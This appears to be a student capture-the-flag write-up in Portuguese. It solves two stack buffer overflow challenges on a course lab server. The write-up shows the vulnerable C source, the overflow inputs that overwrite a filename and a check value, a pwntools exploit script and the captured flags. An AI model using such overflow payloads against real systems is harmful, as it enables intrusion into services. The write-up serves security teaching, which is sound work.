# Desafio 1
Reparamos no ficheiro `main.c`
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char buffer[20];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%28s", &buffer);

    printf("Echo %s\n", buffer);

    printf("I like what you got!\n");
    
    FILE *fd = fopen(meme_file,"r");
    
    while(1){
        if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
            printf("%s", buffer);
        } else {
            break;
        }
    }


    fflush(stdout);
    
    return 0;
}
```
que o buffer tem tamanho 20 e que a variável mem_file não estava a apontar para o ficheiro que queriamos neste caso `flag.txt`. Então mudamos isso:
```c
char meme_file[8] = "mem.txt\0";  ----->  char meme_file[8] = "flag.txt\0";
```

Agora tendo em conta o guião executamos o seguinte comando `nc ctf-sp.dcc.fc.up.pt 4003` com o intput (`aaaaaaaaaaaaaaaaaaaaflag.txt`) e com isto recebemos uma flag (utilizamos este numero de 20 a's por causa do tamanho do buffer):
```shell
seed@VM:~/.../Semana5-Desafio1$ nc ctf-sp.dcc.fc.up.pt 4003
Try to unlock the flag.
Show me what you got: aaaaaaaaaaaaaaaaaaaaflag.txt
Echo aaaaaaaaaaaaaaaaaaaaflag.txt
I like what you got!
flag{758c0aec778b458b0a5c9de858143154}
```
Esta flag `flag{758c0aec778b458b0a5c9de858143154}` foi a que submetemos.

# Desafio 2
Ora bem, primeiro começamos por aceder o ficheiro `exploit-example.py` 
```python
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-sp.dcc.fc.up.pt', 4003)

r.recvuntil(b":")
r.sendline(b"Tentar nao custa")
r.interactive()
```
e alteramos a seguinte linha:
```python
(...)
    r = remote('ctf-sp.dcc.fc.up.pt', 4003)  -----> r = remote('ctf-sp.dcc.fc.up.pt', 4000)
(...)
```
Fomos ao `main.c` 
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char val[4] = "\xef\xbe\xad\xde";
    char buffer[20];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%32s", &buffer);
    if(*(int*)val == 0xfefc2223) {
        printf("I like what you got!\n");
        
        FILE *fd = fopen(meme_file,"r");
        
        while(1){
            if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
                printf("%s", buffer);
            } else {
                break;
            }
        }
    } else {
        printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
    }

    fflush(stdout);
    
    return 0;
}
```
e reparamos que existe uma variável nova por definida por `char val[4] = "\xef\xbe\xad\xde";`, que supostamente tinha de apontar para `*(int*)val == 0xfefc2223` logo tentamos usar 20 caracteres a's porque o buffer tem tamanho 20, seguido pelo tal endereço no formato `\xfe\xfc\x22\x23` seguido de `flag.txt`. Depois introduzimos esse código no `exploit-example.py` 
```python
(...)
r.sendline(b"aaaaaaaaaaaaaaaaaaaa\xfe\xfc\x22\x23flag.txt")
(...)
```
ao executar o programa, foi nos dito que a flag tinha de ser ao contrário então alteramos isso:
```python
(...)
r.sendline(b"aaaaaaaaaaaaaaaaaaaa\x23\x22\xfc\xfeflag.txt")
(...)
```
I com isso foi nos dada a flag:
```shell
seed@VM:~/.../semana_5_ctf_2$ python3 exploit-example.py
    [+] Opening connection to ctf-sp.dcc.fc.up.pt on port 4000: Done
    [*] Switching to interactive mode
    I like what you got!
    flag{937958bfd906007250cc72326e027841}
    [*] Got EOF while reading in interactive
    $ 
    [*] Interrupted
    [*] Closed connection to ctf-sp.dcc.fc.up.pt port 4000

```
